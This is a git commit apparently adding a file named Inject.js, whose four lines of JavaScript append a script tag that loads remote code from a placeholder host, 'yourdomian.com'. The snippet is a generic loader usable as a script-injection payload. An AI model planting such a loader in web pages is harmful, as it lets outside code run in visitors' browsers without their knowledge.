9daee55bc25cc86bb3326387dcd1ee32220d3f1b
Jealousy <67923032+JeaIousy@users.noreply.github.com>
2021-09-02 19:40:54 -0700

    Create Inject.js

---
+++ Inject.js
@@ -0,0 +1,4 @@
+var script = document.createElement('script');
+script.setAttribute('src', 'http://yourdomian.com/your_script.js');
+script.setAttribute('type', 'text/javascript');
+document.getElementsByTagName('head')[0].appendChild(script);
